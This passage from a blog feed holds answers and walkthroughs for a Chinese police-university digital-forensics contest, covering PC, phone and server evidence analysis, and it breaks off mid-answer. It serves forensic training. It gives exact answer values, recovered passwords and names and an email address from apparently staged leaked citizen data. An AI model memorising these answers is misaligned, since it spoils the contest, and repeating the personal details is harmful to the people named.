alt="sjfx-5"></p><p><strong>21、“鲸易元MALL管理系统”管理后台中，已支付订单的支付总金额总计为多少元&#x2F;RMB？【答案格式：123】</strong></p><p>71979976</p><p>导出订单管理的数据，然后excel求和就行</p><p><strong>22、“鲸易元MALL管理系统”管理后台中，在提现账号管理页面中银行卡的记录数为？【答案格式：123】</strong></p><p>6701</p><p><img src="/2024/11/25/2024FIC%E5%86%B3%E8%B5%9B/sjfx-7.png" alt="sjfx-7"></p><p><strong>23、“鲸易元MALL管理系统”管理后台中，打款成功的提现记录数量为？【答案格式：123】</strong></p><p>8403</p><p><img src="/2024/11/25/2024FIC%E5%86%B3%E8%B5%9B/sjfx-8.png" alt="sjfx-8"></p><p><strong>24、“鲸易元MALL管理系统”管理后台中，打款成功的提现应打款金额总计为多少元&#x2F;RMB？【答案格式：123】</strong></p><p>10067655</p><p>同21，导出对应的表然后excel求和</p><p><strong>25、“鲸易元MALL管理系统”管理后台中，拼券活动D仓位的收益率为？【答案格式：100%】</strong></p><p>8%</p><p><img src="/2024/11/25/2024FIC%E5%86%B3%E8%B5%9B/sjfx-10.png" alt="sjfx-10"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2024警察大学第七届“精武杯”电子数据取证技能比武wp</title>
      <link href="/2024/11/04/2024%E8%AD%A6%E5%AF%9F%E5%A4%A7%E5%AD%A6%E7%AC%AC%E4%B8%83%E5%B1%8A%E2%80%9C%E7%B2%BE%E6%AD%A6%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%8A%80%E8%83%BD%E6%AF%94%E6%AD%A6wp/"/>
      <url>/2024/11/04/2024%E8%AD%A6%E5%AF%9F%E5%A4%A7%E5%AD%A6%E7%AC%AC%E4%B8%83%E5%B1%8A%E2%80%9C%E7%B2%BE%E6%AD%A6%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%8A%80%E8%83%BD%E6%AF%94%E6%AD%A6wp/</url>
      
        <content type="html"><![CDATA[<h1 id="2024警察大学第七届“精武杯”电子数据取证技能比武wp"><a href="#2024警察大学第七届“精武杯”电子数据取证技能比武wp" class="headerlink" title="2024警察大学第七届“精武杯”电子数据取证技能比武wp"></a><strong>2024警察大学第七届“精武杯”电子数据取证技能比武wp</strong></h1><h2 id="2024警察大学第七届“精武杯”电子数据取证技能比武题目列表"><a href="#2024警察大学第七届“精武杯”电子数据取证技能比武题目列表" class="headerlink" title="2024警察大学第七届“精武杯”电子数据取证技能比武题目列表"></a><strong>2024警察大学第七届“精武杯”电子数据取证技能比武题目列表</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"> 计算机和手机取证</span><br><span class="line"></span><br><span class="line">1. 请综合分析计算机和手机检材，计算机最近一次登录的账户名是</span><br><span class="line">2. 请综合分析计算机和手机检材，计算机最近一次插入的USB存储设备串号是</span><br><span class="line">3. 请综合分析计算机和手机检材，谢弘的房间号是（）室</span><br><span class="line">4. 请综合分析计算机和手机检材，曹锦芳的手机号后四位是</span><br><span class="line">5. 请综合分析计算机和手机检材，找到全部4份快递相关的公民信息文档，按姓名+电话+地址去重后共有多少条？</span><br><span class="line">6. 请综合分析计算机和手机检材，统计检材内共有几份购票平台相关的公民信息文档</span><br><span class="line">7. 请综合分析计算机和手机检材，樊海锋登记的邮箱账号是</span><br><span class="line">8. 请综合分析计算机和手机检材，统计购票平台相关的文档，去重后共有多少条身份证号为上海的公民信息？</span><br><span class="line">9. 请分析手机检材，2022年11月7日，嫌疑人发送了几条短信？</span><br><span class="line">10. 请分析手机检材，其中保存了多少条公民住房信息？</span><br><span class="line"></span><br><span class="line"> 服务器取证</span><br><span class="line"></span><br><span class="line">1. 请对所给服务器检材进行分析，请写出管理员安装“mdadm-4.1-9.el7_9.x86_64”的时间？（答案格式：18:18:18）</span><br><span class="line">2. 请对所给服务器检材进行分析，请写出宝塔默认建站的目录是什么？（答案格式：/abc/def）</span><br><span class="line">3. 请对所给服务器检材进行分析，请写出ip为192.168.157.1的机器登陆失败的时间是什么时候？（答案格式：xxxx-xx-xx xx:xx:xx）</span><br><span class="line">4. 请对所给服务器检材进行分析，写出网站的数据库root帐号密码？（答案格式：xxxx）</span><br><span class="line">5. 请对所给服务器检材进行分析，请分析网站后台管理员帐号的加密方式（答案格式：xx($xx.xxx($xxx)）</span><br><span class="line">6. 请对所给服务器检材进行分析，网站首页友情链接中的“弘连网络“的更新时间是什么时候？（答案格式：xxxx-xx-xx xx:xx:xx）</span><br><span class="line">7. 请对所给服务器检材进行分析，网站后台管理页面入口文件名是什么？（答案格式：xxx.php）</span><br><span class="line">8. 请对所给服务器检材进行分析，网站数据库备份文件的sha256的值是多少？（答案格式：a656ac5f9e9d3bc2915aec31a5dfd0bd3bd3ef1ac497016dafae43669d7d6d22 不区分大小写）</span><br><span class="line">9. 请对所给服务器检材进行分析，网站数据库备份文件的解压密码是多少？（答案格式：xxxxxxx区分大小写）</span><br><span class="line">10. 请对所给服务器检材进行分析，商城中“弘连火眼手机分析专用机MT510”商品的原价是多少？（只填写数字，精确到小数点后2位：9999.99）</span><br><span class="line"></span><br><span class="line"> 流量取证</span><br><span class="line"></span><br><span class="line">1. 请分析流量分析.pcapng文件，并回答入侵者的IP地址是？</span><br><span class="line">2. 请分析流量分析.pcapng文件，并回答被入侵计算机中的cms软件版本是？(答案格式：1.1.1)</span><br><span class="line">3. 请分析流量分析.pcapng文件，并回答被入侵计算机中的MySQL版本号是？(答案格式：1.1.1)</span><br><span class="line">4. 请分析流量分析.pcapng文件，并回答被入侵计算机中的MySQL root账号密码是？</span><br><span class="line">5. 请分析流量分析.pcapng文件，并回答入侵者利用数据库管理工具创建了一个文件，该文件名为？</span><br><span class="line">6. 请分析流量分析.pcapng文件，并回答被入侵计算机中PHP环境禁用了几个函数？</span><br><span class="line">7. 请分析流量分析.pcapng文件，并回答入侵者提权后，执行的第1条命令是？</span><br><span class="line">8. 请分析流量分析.pcapng文件，并回答被入侵计算机开机时间是？</span><br><span class="line">A、2019/6/13 18:51:33</span><br><span class="line">B、2019/6/13 18:50:33</span><br><span class="line">C、2019/6/13 18:53:33</span><br><span class="line">D、2019/6/13 18:52:33</span><br><span class="line">9. 请分析流量分析.pcapng文件，并回答被入侵计算机桌面上的文件中flag是？(答案格式：abcdef123456789)</span><br><span class="line">10. 请分析流量分析.pcapng文件，并回答图片文件中的flag是？(答案格式：abcdef123456789)</span><br><span class="line"></span><br><span class="line"> APK功能分析</span><br><span class="line"></span><br><span class="line">1. 请分析1.备忘录.apk反编译出的文件中，正确答案在哪个文件里？</span><br><span class="line">2. 请分析1.备忘录.apk并找到程序中的主activity是？（答案格式：com.tencent.mm.activity）</span><br><span class="line">3. 请分析1.备忘录.apk并找到程序中的flag值（答案格式：HL&#123;66666666-1-1-1-1&#125;）</span><br><span class="line">4. 请分析2.easyapk.apk中SharedPreferences配置文件的名称(包括后缀)是什么？</span><br><span class="line">5. 请分析2.easyapk.apk并找到程序中的flag值（答案格式：HL&#123;66666666-1-1-1-1&#125;）</span><br><span class="line">6. 请分析3.verify.apk，该程序中所使用的AES加密KEY值为</span><br><span class="line">7. 请分析3.verify.apk并找到程序中的flag值（答案格式：HL&#123;66666666-1-1-1-1&#125;）</span><br><span class="line">8. 请分析4.easyjni.zip，压缩包中数据库的解密秘钥为</span><br><span class="line">9. 请分析4.easyjni.zip并找到程序中的flag值（答案格式：HL&#123;66666666-1-1-1-1&#125;）</span><br><span class="line">10. 请分析5.calc.apk并找到程序中的flag值（答案格式：HL&#123;66666666-1-1-1-1&#125;）</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="题目解析"><a href="#题目解析" class="headerlink" title="题目解析"></a><strong>题目解析</strong></h2><h3 id="计算机和手机取证"><a href="#计算机和手机取证" class="headerlink" title="计算机和手机取证"></a><strong>计算机和手机取证</strong></h3><p><strong>1. 请综合分析计算机和手机检材，计算机最近一次登录的账户名是</strong></p><p><img src="/2024/11/04/2024%E8%AD%A6%E5%AF%9F%E5%A4%A7%E5%AD%A6%E7%AC%AC%E4%B8%83%E5%B1%8A%E2%80%9C%E7%B2%BE%E6%AD%A6%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%8A%80%E8%83%BD%E6%AF%94%E6%AD%A6wp/sj&pc-1.png" alt="sj&amp;pc-1"></p><p>admin</p><p><strong>2. 请综合分析计算机和手机检材，计算机最近一次插入的USB存储设备串号是</strong></p><p><img src="/2024/11/04/2024%E8%AD%A6%E5%AF%9F%E5%A4%A7%E5%AD%A6%E7%AC%AC%E4%B8%83%E5%B1%8A%E2%80%9C%E7%B2%BE%E6%AD%A6%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%8A%80%E8%83%BD%E6%AF%94%E6%AD%A6wp/sj&pc-2.png" alt="sj&amp;pc-2"></p><p>S3JKNX0JA05097Y</p><p><strong>3. 请综合分析计算机和手机检材，谢弘的房间号是（）室</strong></p><p>这个真没想到；在PC检材部分有4个伪装成压缩包的xlsx</p><p>改格式后打开顺丰1k.xlsx搜索谢弘发现答案；可能一开始将其当作地址搜索的思路就是不对的，这种细节信息要么出现在图片里，要么在文档或者聊天记录里；另外嫌疑人手机里面的那些产权信息也很有误导性，让人以为信息就在手机里；（我太菜了）</p><p><img src="/2024/11/04/2024%E8%AD%A6%E5%AF%9F%E5%A4%A7%E5%AD%A6%E7%AC%AC%E4%B8%83%E5%B1%8A%E2%80%9C%E7%B2%BE%E6%AD%A6%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%8A%80%E8%83%BD%E6%AF%94%E6%AD%A6wp/sj&pc-3.png" alt="image-20241103093223483"></p><p>201</p><p><strong>4. 请综合分析计算机和手机检材，曹锦芳的手机号后四位是</strong></p><p>曹锦芳的手机号码在顺丰2k那里</p><p><img src="/2024/11/04/2024%E8%AD%A6%E5%AF%9F%E5%A4%A7%E5%AD%A6%E7%AC%AC%E4%B8%83%E5%B1%8A%E2%80%9C%E7%B2%BE%E6%AD%A6%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%8A%80%E8%83%BD%E6%AF%94%E6%AD%A6wp/sj&pc-4.png" alt="sj&amp;pc-4"></p><p>0683</p><p><strong>5. 请综合分析计算机和手机检材，找到全部4份快递相关的公民信息文档，按姓名+电话+地址去重后共有多少条？</strong></p><p>把所有的数据都放到一个excel里，加上表头，用excel自带的删除重复项功能即可；</p><p><img src="/2024/11/04/2024%E8%AD%A6%E5%AF%9F%E5%A4%A7%E5%AD%A6%E7%AC%AC%E4%B8%83%E5%B1%8A%E2%80%9C%E7%B2%BE%E6%AD%A6%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%8A%80%E8%83%BD%E6%AF%94%E6%AD%A6wp/sj&pc-5.png" alt="sj&amp;pc-5"></p><p>4997</p><p><strong>6. 请综合分析计算机和手机检材，统计检材内共有几份购票平台相关的公民信息文档</strong></p><p>一共三份</p><p>首先发现微软便签记录了两个VC密码，推断一个是外层密码，一个是内层密码，不同密码挂载之后东西不一样；合理推断和第6题相关，其他地方真找不到了；</p><p>然后两个密码下分别发现12306裤子1，12306裤子3，就是从12306获取的公民信息数据库，还有一个2在外层的回收站里；用R-studio恢复一下就有了；</p><p><strong>7. 请综合分析计算机和手机检材，樊海锋登记的邮箱账号是</strong></p><p>樊海锋在裤子1里；</p><p><img src="/2024/11/04/2024%E8%AD%A6%E5%AF%9F%E5%A4%A7%E5%AD%A6%E7%AC%AC%E4%B8%83%E5%B1%8A%E2%80%9C%E7%B2%BE%E6%AD%A6%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%8A%80%E8%83%BD%E6%AF%94%E6%AD%A6wp/sj&pc-7.png" alt="sj&amp;pc-7"></p><p><a href="mailto:&#x37;&#50;&#x37;&#56;&#x37;&#x35;&#x35;&#56;&#52;&#x40;&#x70;&#x70;&#46;&#99;&#111;&#x6d;">&#x37;&#50;&#x37;&#56;&#x37;&#x35;&#x35;&#56;&#52;&#x40;&#x70;&#x70;&#46;&#99;&#111;&#x6d;</a></p><p><strong>8. 请综合分析计算机和手机检材，统计购票平台相关的文档，去重后共有多少条身份证号为上海的公民信息？</strong></p><p>一样的先合并所有文件内容；</p><p>可以把分割符改成“,”然后改表头，保存为csv文件，用pandas库去重，去重后直接读取身份证号那一列，310开头的就计数，</p><p>算出来最后是110</p><p><img src="/2024/11/04/2024%E8%AD%A6%E5%AF%9F%E5%A4%A7%E5%AD%A6%E7%AC%AC%E4%B8%83%E5%B1%8A%E2%80%9C%E7%B2%BE%E6%AD%A6%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%8A%80%E8%83%BD%E6%AF%94%E6%AD%A6wp/sj&pc-8.png" alt="sj&amp;pc-8"></p><p><strong>9. 请分析手机检材，2022年11月7日，嫌疑人发送了几条短信？</strong></p><p><img src="/2024/11/04/2024%E8%AD%A6%E5%AF%9F%E5%A4%A7%E5%AD%A6%E7%AC%AC%E4%B8%83%E5%B1%8A%E2%80%9C%E7%B2%BE%E6%AD%A6%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%8A%80%E8%83%BD%E6%AF%94%E6%AD%A6wp/sj&pc-9.png" alt="sj&amp;pc-9"></p><p>一共是3条</p><p><strong>10. 请分析手机检材，其中保存了多少条公民住房信息？</strong></p><p><img src="/2024/11/04/2024%E8%AD%A6%E5%AF%9F%E5%A4%A7%E5%AD%A6%E7%AC%AC%E4%B8%83%E5%B1%8A%E2%80%9C%E7%B2%BE%E6%AD%A6%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%8A%80%E8%83%BD%E6%AF%94%E6%AD%A6wp/sj&pc-10.png" alt="image-20241103111018948">嫌疑人跟人聊天的时候对面要买公民产权信息，嫌疑人就发了几条给他验验货，上图是所有的，一共12条</p><h3 id="服务器取证"><a href="#服务器取证" class="headerlink" title="服务器取证"></a><strong>服务器取证</strong></h3><p>配置须知：</p><p>第一，给的服务器检材是三个1G的.001和一个较大的.E01,实际上E01是系统盘，而三个001是数据盘，因此要先raid重组，这个用火眼的RAID重组工具就行；</p><p><img src="/2024/11/04/2024%E8%AD%A6%E5%AF%9F%E5%A4%A7%E5%AD%A6%E7%AC%AC%E4%B8%83%E5%B1%8A%E2%80%9C%E7%B2%BE%E6%AD%A6%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%8A%80%E8%83%BD%E6%AF%94%E6%AD%A6wp/raid1.png" alt="image-20241103175240891"></p><p><img src="/2024/11/04/2024%E8%AD%A6%E5%AF%9F%E5%A4%A7%E5%AD%A6%E7%AC%AC%E4%B8%83%E5%B1%8A%E2%80%9C%E7%B2%BE%E6%AD%A6%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%8A%80%E8%83%BD%E6%AF%94%E6%AD%A6wp/raid2.png" alt="image-20241103175255276"></p><p>用图二重组；</p><p>重组后的盘和E01作为多镜像文件导入火眼证据综合分析软件；然后仿真的时候也要两个一块仿真；（这也算是积累了服务器的一种形式吧）</p><p>第二，好的ssh工具提高取证效率，因此要配置好ssh</p><p>和ssh有关的配置:一个是&#x2F;etc&#x2F;ssh&#x2F;sshd_config另一个是&#x2F;etc&#x2F;hosts.allow，这题要改了hosts.allow才能连上ssh</p><p>第三，服务器可以使用dhcp分配，但那样不知道为何ssh连接不上，建议使用静态ip，如果忘了静态IP怎么配，提醒一下</p><p>修改为NAT模式，使得虚拟机连接到虚拟网络；修改&#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-ens33的</p><p>BOOTPROTO由dhcp改为static；加上IPADDR、GATEWAY、PREFIX参数；确保虚拟机正确配置到虚拟网段，换句话说在同一网段之下；</p><p><strong>1. 请对所给服务器检材进行分析，请写出管理员安装“mdadm-4.1-9.el7_9.x86_64”的时间？（答案格式：18:18:18）</strong></p><p>历史记录里面没有，但是在yum的日志里有:&#x2F;var&#x2F;log&#x2F;yum.log</p><p><img src="/2024/11/04/2024%E8%AD%A6%E5%AF%9F%E5%A4%A7%E5%AD%A6%E7%AC%AC%E4%B8%83%E5%B1%8A%E2%80%9C%E7%B2%BE%E6%AD%A6%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%8A%80%E8%83%BD%E6%AF%94%E6%AD%A6wp/fwq-1.png" alt="fwq-1"></p><p>13:13:01</p><p><strong>2. 请对所给服务器检材进行分析，请写出宝塔默认建站的目录是什么？（答案格式：&#x2F;abc&#x2F;def）</strong></p><p>bt 5修改宝塔面板的密码，bt 14，从内网网址登录</p><p>然后看面板设置，是&#x2F;data</p><p><img src="/2024/11/04/2024%E8%AD%A6%E5%AF%9F%E5%A4%A7%E5%AD%A6%E7%AC%AC%E4%B8%83%E5%B1%8A%E2%80%9C%E7%B2%BE%E6%AD%A6%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%8A%80%E8%83%BD%E6%AF%94%E6%AD%A6wp/fwq-2.png" alt="fwq-2"></p><p><strong>3. 请对所给服务器检材进行分析，请写出ip为192.168.157.1的机器登陆失败的时间是什么时候？（答案格式：xxxx-xx-xx xx:xx:xx）</strong></p><p><img src="/2024/11/04/2024%E8%AD%A6%E5%AF%9F%E5%A4%A7%E5%AD%A6%E7%AC%AC%E4%B8%83%E5%B1%8A%E2%80%9C%E7%B2%BE%E6%AD%A6%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%8A%80%E8%83%BD%E6%AF%94%E6%AD%A6wp/fwq-3.png" alt="image-20241103135212274"></p><p>2020-10-09 16:47:29</p><p><strong>4. 请对所给服务器检材进行分析，写出网站的数据库root帐号密码？（答案格式：xxxx）</strong></p><p>首先网站本来应该在&#x2F;data目录之下，但这个目录是空的，翻一下，发现网站数据在RAID盘里，给他挂载到&#x2F;data下</p><p><img src="/2024/11/04/2024%E8%AD%A6%E5%AF%9F%E5%A4%A7%E5%AD%A6%E7%AC%AC%E4%B8%83%E5%B1%8A%E2%80%9C%E7%B2%BE%E6%AD%A6%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%8A%80%E8%83%BD%E6%AF%94%E6%AD%A6wp/fwq-4-2.png" alt="image-20241103145520929"></p><p><img src="/2024/11/04/2024%E8%AD%A6%E5%AF%9F%E5%A4%A7%E5%AD%A6%E7%AC%AC%E4%B8%83%E5%B1%8A%E2%80%9C%E7%B2%BE%E6%AD%A6%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%8A%80%E8%83%BD%E6%AF%94%E6%AD%A6wp/fwq-4-1.png" alt="fwq-4-1"></p><p>网站数据库的配置在&#x2F;config&#x2F;database.php下，解个混淆就行（base64+url）</p><p><img src="/2024/11/04/2024%E8%AD%A6%E5%AF%9F%E5%A4%A7%E5%AD%A6%E7%AC%AC%E4%B8%83%E5%B1%8A%E2%80%9C%E7%B2%BE%E6%AD%A6%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%8A%80%E8%83%BD%E6%AF%94%E6%AD%A6wp/fwq-4.png" alt="image-20241103145410031"></p><p>hl@7001</p><p><strong>5. 请对所给服务器检材进行分析，请分析网站后台管理员帐号的加密方式（答案格式：xx($xx.xxx($xxx)）</strong></p><p>这题学会了用vscode的转到定义功能来审计代码，大大的有用！！</p><p>账号在被创建的时候，密码就会被加密，所以我们可以从此入手，找到管理员账号的创建逻辑；</p><p>下载源码</p><p>搜索管理员添加之类的找到这个：</p><p><img src="/2024/11/04/2024%E8%AD%A6%E5%AF%9F%E5%A4%A7%E5%AD%A6%E7%AC%AC%E4%B8%83%E5%B1%8A%E2%80%9C%E7%B2%BE%E6%AD%A6%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%8A%80%E8%83%BD%E6%AF%94%E6%AD%A6wp/fwq-5.png" alt="image-20241103153124565"></p><p>看返回，调用了AdminService类的AdminSave代码，右键AdminSave转到定义（::表示调用类的静态方法）</p><p><img src="/2024/11/04/2024%E8%AD%A6%E5%AF%9F%E5%A4%A7%E5%AD%A6%E7%AC%AC%E4%B8%83%E5%B1%8A%E2%80%9C%E7%B2%BE%E6%AD%A6%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%8A%80%E8%83%BD%E6%AF%94%E6%AD%A6wp/fwq-5-1.png" alt="image-20241103153305969"></p><p>这个方法大概是对创建账号的数据进行审计，有无就会返回错误码-1，没有的话</p><p>看情况：(?相当于条件逻辑)如果id为空，empty返回true，用AdminInsert插入新的信息；返回false则执行:右边的函数，插入信息；</p><p>右键AdminInsert，找到添加账号</p><p><img src="/2024/11/04/2024%E8%AD%A6%E5%AF%9F%E5%A4%A7%E5%AD%A6%E7%AC%AC%E4%B8%83%E5%B1%8A%E2%80%9C%E7%B2%BE%E6%AD%A6%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%8A%80%E8%83%BD%E6%AF%94%E6%AD%A6wp/fwq-5-2.png" alt="image-20241103153816718"></p><p>添加账号的时候，密码用LoginPwdEncryption处理了，右键有</p><p><img src="/2024/11/04/2024%E8%AD%A6%E5%AF%9F%E5%A4%A7%E5%AD%A6%E7%AC%AC%E4%B8%83%E5%B1%8A%E2%80%9C%E7%B2%BE%E6%AD%A6%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%8A%80%E8%83%BD%E6%AF%94%E6%AD%A6wp/fwq-5-3.png" alt="image-20241103154153198"></p><p>md5($salt.trim($pwd))</p><p><strong>6. 请对所给服务器检材进行分析，网站首页友情链接中的“弘连网络“的更新时间是什么时候？（答案格式：xxxx-xx-xx xx:xx:xx）</strong></p><p>这里就需要重构网站了；</p><p>首先替换混淆的数据库配置（数据库的hostname设置为127.0.0.1这样直接用服务器的地址就可以访问数据库）；给hosts加上这一行使得可以主机可以通过域名直接找到网站而无需特地寻找端口；</p><p><img src="/2024/11/04/2024%E8%AD%A6%E5%AF%9F%E5%A4%A7%E5%AD%A6%E7%AC%AC%E4%B8%83%E5%B1%8A%E2%80%9C%E7%B2%BE%E6%AD%A6%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%8A%80%E8%83%BD%E6%AF%94%E6%AD%A6wp/fwq-6.png" alt="image-20241103163115534"></p><p>docker ps -a 发现数据库容器，docker start启动；</p><p><img src="/2024/11/04/2024%E8%AD%A6%E5%AF%9F%E5%A4%A7%E5%AD%A6%E7%AC%AC%E4%B8%83%E5%B1%8A%E2%80%9C%E7%B2%BE%E6%AD%A6%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%8A%80%E8%83%BD%E6%AF%94%E6%AD%A6wp/fwq-6-1.png" alt="image-20241103163219853"></p><p>然后chmod 777 -R给网站目录授权</p><p><img src="/2024/11/04/2024%E8%AD%A6%E5%AF%9F%E5%A4%A7%E5%AD%A6%E7%AC%AC%E4%B8%83%E5%B1%8A%E2%80%9C%E7%B2%BE%E6%AD%A6%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%8A%80%E8%83%BD%E6%AF%94%E6%AD%A6wp/fwq-6-2.png" alt="fwq-6-2"></p><p>连接数据库的端口在混淆那题有，3307；</p><p>这样一来，就可以访问网站及其数据库了</p><p>友链在此</p><p><img src="/2024/11/04/2024%E8%AD%A6%E5%AF%9F%E5%A4%A7%E5%AD%A6%E7%AC%AC%E4%B8%83%E5%B1%8A%E2%80%9C%E7%B2%BE%E6%AD%A6%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%8A%80%E8%83%BD%E6%AF%94%E6%AD%A6wp/fwq-6-3.png" alt="image-20241103163721747"></p><p>访问数据库，找到对应的table为sxo_link</p><p><img src="/2024/11/04/2024%E8%AD%A6%E5%AF%9F%E5%A4%A7%E5%AD%A6%E7%AC%AC%E4%B8%83%E5%B1%8A%E2%80%9C%E7%B2%BE%E6%AD%A6%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%8A%80%E8%83%BD%E6%AF%94%E6%AD%A6wp/fwq-6-4.png" alt="image-20241103163805144"></p><p>转换其时间戳，为2023-02-16 15:02:29</p><p><strong>7. 请对所给服务器检材进行分析，网站后台管理页面入口文件名是什么？（答案格式：xxx.php）</strong></p><p>在宝塔的响应日志里翻找，找到了 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.100.1 - - [16/Feb/2023:15:00:37 +0800] &quot;GET /4008003721.php?s=admin/index.html HTTP/1.1&quot; 200 9950 &quot;http://www.hl2023.cn/4008003721.php?s=index/index.html&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105</span><br></pre></td></tr></table></figure><p>复制路由和参数，重定向到了这里</p><p><img src="/2024/11/04/2024%E8%AD%A6%E5%AF%9F%E5%A4%A7%E5%AD%A6%E7%AC%AC%E4%B8%83%E5%B1%8A%E2%80%9C%E7%B2%BE%E6%AD%A6%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%8A%80%E8%83%BD%E6%AF%94%E6%AD%A6wp/fwq-7.png" alt="image-20241103165607675"></p><p>4008003721.php</p><p><strong>8. 请对所给服务器检材进行分析，网站数据库备份文件的sha256的值是多少？（答案格式：a656ac5f9e9d3bc2915aec31a5dfd0bd3bd3ef1ac497016dafae43669d7d6d22 不区分大小写）</strong></p><p>这个在backup里面有：9dede75e455a7c4c5cc4b61e41570adf82af25251c5fd8456a637add864b0af0</p><p><img src="/2024/11/04/2024%E8%AD%A6%E5%AF%9F%E5%A4%A7%E5%AD%A6%E7%AC%AC%E4%B8%83%E5%B1%8A%E2%80%9C%E7%B2%BE%E6%AD%A6%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%8A%80%E8%83%BD%E6%AF%94%E6%AD%A6wp/fwq-8.png" alt="image-20241103173218063"></p><p><strong>9. 请对所给服务器检材进行分析，网站数据库备份文件的解压密码是多少？（答案格式：xxxxxxx区分大小写）</strong></p><p>密码在&#x2F;root下隐藏文件.w0rd.txt里面，爆破</p><p><img 